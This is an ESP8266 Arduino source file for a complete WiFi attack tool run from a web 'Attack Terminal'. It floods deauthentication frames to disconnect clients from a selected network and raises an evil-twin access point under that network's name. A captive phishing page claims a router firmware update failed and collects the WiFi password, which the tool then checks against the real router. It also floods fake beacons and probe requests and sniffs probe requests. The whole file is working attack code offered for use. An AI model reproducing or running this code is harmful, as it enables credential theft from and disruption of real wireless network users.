#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <ESP8266HTTPClient.h>

extern "C" {
#include "user_interface.h"
}


typedef struct
{
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
}  _Network;


const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

_Network _networks[16];
_Network _selectedNetwork;

void clearArray() {
  for (int i = 0; i < 16; i++) {
    _Network _network;
    _networks[i] = _network;
  }

}

String _correct = "";
String _tryPassword = "";

// Default main strings
#define SUBTITLE "ACCESS POINT RESCUE MODE"
#define TITLE "<warning style='text-shadow: 1px 1px black;color:yellow;font-size:7vw;'>&#9888;</warning> Firmware Update Failed"
#define BODY "Your router encountered a problem while automatically installing the latest firmware update.<br><br>To revert the old firmware and manually update later, please verify your password."

String header(String t) {
  String a = String(_selectedNetwork.ssid);
  String CSS = "article { background: #111; padding: 1.3em; border: 1px solid #00ff66; }"
               "body { color: #00ff66; background-color: #050505; font-family: 'Courier New', monospace; font-size: 16px; line-height: 22px; margin: 0; padding: 0; }"
               "div { padding: 0.5em; }"
               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; font-size:6vw; color: #ff0055; text-shadow: 0 0 8px #ff0055; }"
               "input { width: 100%; padding: 10px; margin: 8px 0; background: #000; color: #00ff66; box-sizing: border-box; border: 1px solid #00ff66; border-radius: 4px; outline: none; }"
               "label { color: #00f3ff; display: block; font-style: italic; font-weight: bold; }"
               "nav { background: #0a0a0a; color: #00f3ff; border-bottom: 2px solid #00ff66; display: block; font-size: 1.2em; padding: 1em; text-shadow: 0 0 5px #00f3ff; }"
               "nav b { display: block; font-size: 1.4em; margin-bottom: 0.3em; color: #fff; }" 
               "textarea { width: 100%; }"
               ;
  String h = "<!DOCTYPE html><html>"
             "<head><title><center>" + a + " :: " + t + "</center></title>"
             "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
             "<style>" + CSS + "</style>"
             "<meta charset=\"UTF-8\"></head>"
             "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
  return h;
}

String footer() {
  return "</div><div class=q><a>&#169; [SEC_OPS // HONEYGRID SYSTEM]</a></div>";
}

String index() {
  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action='/' method=post><label>WiFi password:</label>" +
         "<input type=password id='password' name='password' minlength='8'></input><input type=submit value='AUTHORIZE & CONTINUE' style='background:#00ff66; color:#000; font-weight:bold; cursor:pointer;'></form>" + footer();
}

// Promiscuous callback for sniffing probe requests (Karma Attack Logic)
void snifferCallback(uint8_t *buf, uint16_t len) {
  if (len > 24 && buf[0] == 0x40) {
    int pos = 24;
    while (pos < len - 2) {
      uint8_t tag_num = buf[pos];
      uint8_t tag_len = buf[pos + 1];
      if (tag_num == 0 && tag_len > 0 && tag_len < 33) {
        String req_ssid = "";
        for (int i = 0; i < tag_len; i++) {
          req_ssid += (char)buf[pos + 2 + i];
        }
        if (req_ssid.length() > 0) {
          Serial.println("[KARMA] Caught probe request for SSID: " + req_ssid);
        }
        break;
      }
      pos += 2 + tag_len;
    }
  }
}

void setup() {

  Serial.begin(115200);
  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  wifi_set_promiscuous_rx_cb(&snifferCallback);
  
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
  WiFi.softAP("HACKER", "hacker123");
  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  webServer.on("/admin", handleAdmin);
  webServer.onNotFound(handleIndex);
  webServer.begin();
}

void performScan() {
  int n = WiFi.scanNetworks();
  clearArray();
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _Network network;
      network.ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }

      network.ch = WiFi.channel(i);
      _networks[i] = network;
    }
  }
}

bool hotspot_active = false;
bool deauthing_active = false;
bool beacon_active = false;
bool probe_active = false;
bool karma_active = false;

void handleResult() {
  String html = "";
  if (WiFi.status() != WL_CONNECTED) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    }
    webServer.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 4000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'><style>body{background:#050505; color:#ff0055; font-family:'Courier New', monospace; text-align:center; padding-top:50px;}</style><body><h2>[!] WRONG CREDENTIALS</h2><p style='color:#00ff66;'>Retrying capture pipeline...</p></body></html>");
    Serial.println("[EVIL_TWIN] Wrong password tried!");
  } else {
    _correct = "Successfully got password for: " + _selectedNetwork.ssid + " Password: " + _tryPassword;
    
    Serial.println("[EVIL_TWIN] Successfully captured password credentials!");

    hotspot_active = false;
    dnsServer.stop();
    int n = WiFi.softAPdisconnect (true);
    Serial.println(String(n));
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
    WiFi.softAP("HACKER", "hacker123");
    dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    Serial.println("Good password was entered !");
    Serial.println(_correct);
  }
}


// Hacker-Themed Cyber UI Template
String _tempHTML = "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
                   "<style>"
                   "body { background-color: #050505; color: #00ff66; font-family: 'Courier New', monospace; margin: 0; padding: 10px; }"
                   ".content { max-width: 600px; margin: auto; background: #0c0c0c; border: 1px solid #00ff66; padding: 15px; box-shadow: 0 0 15px rgba(0, 255, 102, 0.2); }"
                   "h2 { text-align: center; color: #00f3ff; text-shadow: 0 0 8px #00f3ff; font-size: 6vw; margin-top: 0; border-bottom: 1px dashed #00ff66; padding-bottom: 8px; }"
                   "table { width: 100%; border-collapse: collapse; margin-top: 15px; color: #fff; }"
                   "th, td { border: 1px solid #00ff66; padding: 8px; text-align: center; font-size: 13px; }"
                   "th { background-color: #002200; color: #00ff66; text-shadow: 0 0 4px #00ff66; }"
                   "tr:nth-child(even) { background-color: #111111; }"
                   "button { background: #000; color: #00ff66; border: 1px solid #00ff66; padding: 8px 10px; margin: 4px; cursor: pointer; font-family: 'Courier New', monospace; font-weight: bold; box-shadow: 0 0 5px rgba(0,255,102,0.2); transition: 0.2s; }"
                   "button:hover { background: #00ff66; color: #000; box-shadow: 0 0 10px #00ff66; }"
                   "button:disabled { background: #1a1a1a; color: #444; border-color: #333; cursor: not-allowed; box-shadow: none; }"
                   "form { display: inline-block; }"
                   "h3 { color: #ff0055; text-align: center; text-shadow: 0 0 5px #ff0055; }"
                   ".btn-container { text-align: center; margin-bottom: 10px; }"
                   "</style>"
                   "</head><body><div class='content'>"
                   "<h2>Attack Terminal</h2>"
                   "<div class='btn-container'>"
                   "<form method='post' action='/?deauth={deauth}'>"
                   "<button '{disabled}'>{deauth_button}</button></form>"
                   "<form method='post' action='/?hotspot={hotspot}'>"
                   "<button '{disabled}'>{hotspot_button}</button></form>"
                   "<form method='post' action='/?beacon={beacon}'>"
                   "<button>{beacon_button}</button></form>"
                   "<form method='post' action='/?probe={probe}'>"
                   "<button>{probe_button}</button></form>"
                   "<form method='post' action='/?karma={karma}'>"
                   "<button>{karma_button}</button></form>"
                   "</div><table><tr><th>SSID</th><th>BSSID</th><th>Ch</th><th>Select</th></tr>";

void handleIndex() {

  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("beacon")) {
    if (webServer.arg("beacon") == "start") {
      beacon_active = true;
      Serial.println("[BEACON_FLOOD] Beacon flood attack started");
    } else if (webServer.arg("beacon") == "stop") {
      beacon_active = false;
      Serial.println("[BEACON_FLOOD] Beacon flood attack stopped");
    }
  }

  if (webServer.hasArg("probe")) {
    if (webServer.arg("probe") == "start") {
      probe_active = true;
      Serial.println("[PROBE_FLOOD] Probe request flood attack started");
    } else if (webServer.arg("probe") == "stop") {
      probe_active = false;
      Serial.println("[PROBE_FLOOD] Probe request flood attack stopped");
    }
  }

  if (webServer.hasArg("karma")) {
    if (webServer.arg("karma") == "start") {
      karma_active = true;
      Serial.println("[KARMA] Karma attack started (Sniffing probe requests)");
    } else if (webServer.arg("karma") == "stop") {
      karma_active = false;
      Serial.println("[KARMA] Karma attack stopped");
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;

      Serial.println("[EVIL_TWIN] Evil Twin Access Point activated and started");

      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP("Hacker", "hacker123");
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  if (hotspot_active == false) {
    String _html = _tempHTML;

    for (int i = 0; i < 16; ++i) {
      if ( _networks[i].ssid == "") {
        break;
      }
      _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>";

      if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
        _html += "<button style='background-color: #00ff66; color: #000; box-shadow: 0 0 8px #00ff66;'>SELECTED</button></form></td></tr>";
      } else {
        _html += "<button>SELECT</button></form></td></tr>";
      }
    }

    if (deauthing_active) {
      _html.replace("{deauth_button}", "[+] STOP DEAUTH");
      _html.replace("{deauth}", "stop");
    } else {
      _html.replace("{deauth_button}", "[-] START DEAUTH");
      _html.replace("{deauth}", "start");
    }

    if (hotspot_active) {
      _html.replace("{hotspot_button}", "[+] STOP EVILTWIN");
      _html.replace("{hotspot}", "stop");
    } else {
      _html.replace("{hotspot_button}", "[-] START EVILTWIN");
      _html.replace("{hotspot}", "start");
    }

    if (beacon_active) {
      _html.replace("{beacon_button}", "[+] STOP BEACON");
      _html.replace("{beacon}", "stop");
    } else {
      _html.replace("{beacon_button}", "[-] START BEACON");
      _html.replace("{beacon}", "start");
    }

    if (probe_active) {
      _html.replace("{probe_button}", "[+] STOP PROBE");
      _html.replace("{probe}", "stop");
    } else {
      _html.replace("{probe_button}", "[-] START PROBE");
      _html.replace("{probe}", "start");
    }

    if (karma_active) {
      _html.replace("{karma_button}", "[+] STOP KARMA");
      _html.replace("{karma}", "stop");
    } else {
      _html.replace("{karma_button}", "[-] START KARMA");
      _html.replace("{karma}", "start");
    }


    if (_selectedNetwork.ssid == "") {
      _html.replace("{disabled}", " disabled");
    } else {
      _html.replace("{disabled}", "");
    }

    _html += "</table>";

    if (_correct != "") {
      _html += "</br><h3>" + _correct + "</h3>";
    }

    _html += "</div></body></html>";
    webServer.send(200, "text/html", _html);

  } else {

    if (webServer.hasArg("password")) {
      _tryPassword = webServer.arg("password");
      if (webServer.arg("deauth") == "start") {
        deauthing_active = false;
      }
      delay(1000);
      WiFi.disconnect();
      WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
      webServer.send(200, "text/html", "<!DOCTYPE html> <html><script> setTimeout(function(){window.location.href = '/result';}, 15000); </script><style>body{background:#050505; color:#00ff66; font-family:'Courier New', monospace; text-align:center; padding-top:50px;}</style></head><body><center><h2 style='color:#00f3ff; text-shadow:0 0 8px #00f3ff;'>[+] AUTHENTICATING CREDENTIALS...</h2><p>Verifying network handshake session...</p></center></body> </html>");
      if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
      }
    } else {
      webServer.send(200, "text/html", index());
    }
  }

}

void handleAdmin() {

  String _html = _tempHTML;

  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("beacon")) {
    if (webServer.arg("beacon") == "start") {
      beacon_active = true;
      Serial.println("[BEACON_FLOOD] Beacon flood attack started (Admin)");
    } else if (webServer.arg("beacon") == "stop") {
      beacon_active = false;
      Serial.println("[BEACON_FLOOD] Beacon flood attack stopped (Admin)");
    }
  }

  if (webServer.hasArg("probe")) {
    if (webServer.arg("probe") == "start") {
      probe_active = true;
      Serial.println("[PROBE_FLOOD] Probe request flood attack started (Admin)");
    } else if (webServer.arg("probe") == "stop") {
      probe_active = false;
      Serial.println("[PROBE_FLOOD] Probe request flood attack stopped (Admin)");
    }
  }

  if (webServer.hasArg("karma")) {
    if (webServer.arg("karma") == "start") {
      karma_active = true;
      Serial.println("[KARMA] Karma attack started (Admin)");
    } else if (webServer.arg("karma") == "stop") {
      karma_active = false;
      Serial.println("[KARMA] Karma attack stopped (Admin)");
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;

      Serial.println("[EVIL_TWIN] Evil Twin Access Point activated (Admin mode)");

      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP("Hacker", "hacker123");
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  for (int i = 0; i < 16; ++i) {
    if ( _networks[i].ssid == "") {
      break;
    }
    _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" +  bytesToStr(_networks[i].bssid, 6) + "'>";

    if ( bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
      _html += "<button style='background-color: #00ff66; color: #000; box-shadow: 0 0 8px #00ff66;'>SELECTED</button></form></td></tr>";
    } else {
      _html += "<button>SELECT</button></form></td></tr>";
    }
  }

  if (deauthing_active) {
    _html.replace("{deauth_button}", "[+] STOP DEAUTH");
    _html.replace("{deauth}", "stop");
  } else {
    _html.replace("{deauth_button}", "[-] START DEAUTH");
    _html.replace("{deauth}", "start");
  }

  if (hotspot_active) {
    _html.replace("{hotspot_button}", "[+] STOP EVILTWIN");
    _html.replace("{hotspot}", "stop");
  } else {
    _html.replace("{hotspot_button}", "[-] START EVILTWIN");
    _html.replace("{hotspot}", "start");
  }

  if (beacon_active) {
    _html.replace("{beacon_button}", "[+] STOP BEACON");
    _html.replace("{beacon}", "stop");
  } else {
    _html.replace("{beacon_button}", "[-] START BEACON");
    _html.replace("{beacon}", "start");
  }

  if (probe_active) {
    _html.replace("{probe_button}", "[+] STOP PROBE");
    _html.replace("{probe}", "stop");
  } else {
    _html.replace("{probe_button}", "[-] START PROBE");
    _html.replace("{probe}", "start");
  }

  if (karma_active) {
    _html.replace("{karma_button}", "[+] STOP KARMA");
    _html.replace("{karma}", "stop");
  } else {
    _html.replace("{karma_button}", "[-] START KARMA");
    _html.replace("{karma}", "start");
  }


  if (_selectedNetwork.ssid == "") {
    _html.replace("{disabled}", " disabled");
  } else {
    _html.replace("{disabled}", "");
  }

  if (_correct != "") {
    _html += "</br><h3>" + _correct + "</h3>";
  }

  _html += "</table></div></body></html>";
  webServer.send(200, "text/html", _html);

}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  const char ZERO = '0';
  const char DOUBLEPOINT = ':';
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += ZERO;
    str += String(b[i], HEX);

    if (i < size - 1) str += DOUBLEPOINT;
  }
  return str;
}

unsigned long now = 0;
unsigned long wifinow = 0;
unsigned long deauth_now = 0;
unsigned long beacon_now = 0;
unsigned long probe_now = 0;

uint8_t broadcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
uint8_t wifi_channel = 1;

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  // Deauth Flood Packet Injection
  if (deauthing_active && millis() - deauth_now >= 1000) {

    wifi_set_channel(_selectedNetwork.ch);

    uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00};

    memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
    memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
    deauthPacket[24] = 1;

    Serial.println("[DEAUTH] Deauthentication frame broadcasted");

    Serial.println(bytesToStr(deauthPacket, 26));
    deauthPacket[0] = 0xC0;
    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));
    Serial.println(bytesToStr(deauthPacket, 26));
    deauthPacket[0] = 0xA0;
    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));

    deauth_now = millis();
  }

  // Beacon Flood Injection Loop
  if (beacon_active && millis() - beacon_now >= 200) {
    Serial.println("[BEACON_FLOOD] Broadcasting valid fake beacon frames...");
    
    String fakeSSIDs[] = {"Free_WiFi", "Public_Net", "Hacker_AP", "Router_5G", "Jio_Fiber", "Airtel_Hotspot", "Govt_Free_Net", "Hotel_Guest", "Starbucks_WiFi", "Airport_Free", "Office_Network", "Coffee_Shop"};
    String randomSSID = fakeSSIDs[random(12)] + String(random(10, 99));
    
    uint8_t ch = random(1, 14);
    wifi_set_channel(ch);

    uint8_t bssid[6];
    for(int i=0; i<6; i++) {
      bssid[i] = random(256);
    }
    bssid[0] = 0x02; 

    uint8_t beaconPacket[128] = {
      0x80, 0x00, 0x00, 0x00, 
      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
      bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], 
      bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], 
      0x00, 0x00, 
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
      0x64, 0x00, 
      0x31, 0x04, 
      0x00, (uint8_t)randomSSID.length()
    };

    int pLen = 36;
    for (int i = 0; i < randomSSID.length() && pLen < 100; i++) {
      beaconPacket[pLen++] = randomSSID[i];
    }

    beaconPacket[pLen++] = 0x01;
    beaconPacket[pLen++] = 0x08;
    beaconPacket[pLen++] = 0x82; 
    beaconPacket[pLen++] = 0x84; 
    beaconPacket[pLen++] = 0x8b; 
    beaconPacket[pLen++] = 0x96; 
    beaconPacket[pLen++] = 0x0c; 
    beaconPacket[pLen++] = 0x12; 
    beaconPacket[pLen++] = 0x18; 
    beaconPacket[pLen++] = 0x24;

    beaconPacket[pLen++] = 0x03;
    beaconPacket[pLen++] = 0x01;
    beaconPacket[pLen++] = ch;

    wifi_send_pkt_freedom(beaconPacket, pLen, 0);
    beacon_now = millis();
  }

  // Probe Flood Injection Loop
  if (probe_active && millis() - probe_now >= 500) {
    Serial.println("[PROBE_FLOOD] Sending probe request frames...");
    
    uint8_t probePacket[26] = {
      0x40, 0x00, 0x00, 0x00, 
      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
      0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 
      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
      0x00, 0x00
    };
    wifi_send_pkt_freedom(probePacket, sizeof(probePacket), 0);
    probe_now = millis();
  }

  if (millis() - now >= 15000) {
    performScan();
    now = millis();
  }

  if (millis() - wifinow >= 2000) {
    if (WiFi.status() != WL_CONNECTED) {
      Serial.println("BAD");
    } else {
      Serial.println("GOOD");
    }
    wifinow = millis();
  }
}
